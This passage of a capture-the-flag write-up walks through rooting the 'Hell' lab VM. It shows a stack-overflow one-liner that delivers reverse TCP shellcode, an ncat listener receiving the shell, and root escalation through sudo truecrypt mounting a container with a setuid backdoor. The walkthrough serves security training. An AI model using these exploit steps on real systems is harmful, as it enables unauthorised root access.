Final Score: 133869

!*!*!*!*! Congratulations, new high score (133869) !*!*!*!*!

I hear the faint sound of chmodding.......
```

I used find to search files whose status was recently changed :  

```plain
milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v /proc
/usr/bin/lesson101
/var/log/auth.log
/var/log/syslog
/tmp
```

The *lesson101* binary is now setuid george (*George is inside !!!*)  

```plain
---s--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101
```

Let's take a lesson again with *George* :  

```plain
$ /usr/bin/lesson101
Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'

I got it once in !! 3 !! whole guesses, can you do better?

Guess my number!!

Number (1-20): 10
You got it in 1 tries, congratulations!
Holy crap I can't believe you did it in less than me!
I'm going to have to get your name for my wall of fame being put into the next version
Name: test

Thanks!
```

When we gives a name long enough the program segfaults (this verb should added to the dictionary). No core file is generated.  

As seen above, we don't have read permissions, luckily ASLR is not activated on the system :  

```plain
milk_4_life@hell:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

So we will be able to set up a shellcode with an olympic swimming-pool of nops in an environment variable and overwrite the saved-eip on the stack with the address of the environment variable.  

How to do this ? Please refer to my [Brainpan 2](http://devloop.users.sourceforge.net/index.php?article73/solution-du-ctf-brainpan2) article.  

Here I used a [reverse TCP shell](http://shell-storm.org/shellcode/files/shellcode-833.php) shellcode. First I wanted to write some Python code to communicate with the program using the *subprocess* module but console buffering makes this really hard to do.  

So the solution was to stupidly give the program the number 10 and the return address (prepended with some padding that must be grown at each wrong attempt) (*enlarge your padding !*). If the number to guess is not 10, just *Ctrl+C* and try again and again (and again).  

Eventually I get my shell with a padding of 2 bytes.  

Victim's side :  

```plain
milk_4_life@hell:~$ python -c "print '10';print 'AA'+'\x77\xff\xfe\xbf'*1000" | /usr/bin/lesson101
Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'

I got it once in !! 3 !! whole guesses, can you do better?

Guess my number!!

Number (1-20): You got it in 1 tries, congratulations!
Holy crap I can't believe you did it in less than me!
I'm going to have to get your name for my wall of fame being put into the next version
Name:
```

Attacker's side :  

```plain
$ ncat -l -p 55555 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Listening on :::55555
Ncat: Listening on 0.0.0.0:55555
Ncat: Connection from 192.168.1.29.
Ncat: Connection from 192.168.1.29:56901.
id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
```

After obtaining an SSH access (use the *authorized\_keys* file) I discovered in *.bash\_history* some references to *Truecrypt*.  

```plain
george@hell:~$ sudo -l
Matching Defaults entries for george on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User george may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/truecrypt
```

A *Truecrypt* container is already on the system but I can't find a working password to open it :  

```plain
george@hell:~$ ls -lh container.tc
-rw------- 1 george george 4.0M Jun 19 21:09 container.tc
```

Beating Hell
------------

So *Truecrypt* allows us to mount crypted volumes on the system. The vulnerability is a classic weak permissions on mouting (just like if there was some line in fstab allowing non-root users to mount volumes without the nosuid option... remeber floppy disks ?) :p  

Unfortunately *Truecrypt* isn't in the *openSUSE* repositories and the rebadged version (*Realcrypt*)can't be found on an official repository so I'd rather launch *Kali Linux* in a VM just to create the *Truecrypt* container.  

Steps are easy : create a small container (10M) that can be mounted on Linux with an *ext2* filesystem (that's important because the setuid permissions must be supported, don't use FAT). Inside we put a setuid root backdoor then we unmount the container to copy it later on the *Hell* system.  

Final steps is to mount the evil volume on *Hell* and to launch our backdoor :  

```plain
george@hell:~$ truecrypt /tmp/crypted.tc /media/truecrypt1
Enter password for /tmp/crypted.tc: 
Enter keyfile [none]: 
Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
george@hell:~$ /media/truecrypt1/getroot 
root@hell:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)
root@hell:~# cat /root/flag.txt 
Congratulations of beating Hell. 

I hope you enjoyed it and there weren't to many trolls in here for you. 

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
```

Trolololololol
--------------

Let's talk about trolls ! The operating system used on this CTF is a Debian 7.5 32bits. So wtf with the 64bits *echoserver.bak* binary ?  

Here is the content of */root/echoserver.py* :  

```python
#!/usr/bin/python
# Trololol lol lol lol lol
import socket
import thread
import random
import sys

def EchoClientHandler(clientSocket, addr) :
        clientSocket.send("\nWelcome to the Admin Panel\n")
        clientSocket.send("Archiving latest version on webserver (echoserver.bak)...\n")
        clientSocket.send("Starting echo server and monitoring...\n")
        while 1:
                trollpoint = random.randint(1,17)
                client_data  = clientSocket.recv(2048)
                if client_data:
                        if len(client_data) > 1000:
                                clientSocket.send("Segmentation fault")
                                sys.exit(0)
                        else :
                                clientSocket.send(client_data)
                else :
                        clientSocket.close()
                        return

echoServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

echoServer.bind(("0.0.0.0", 666))

echoServer.listen(10)

while 1:
        cSock, addr = echoServer.accept()
        thread.start_new_thread(EchoClientHandler, (cSock, addr))
```

Obvisously the binary was just a trap to waste our time... Even the segfault message was false. The 64bit ELF program was never launched on the system, there's only this Python code (U mad bro ?)

*Published July 20 2014 at 11 01*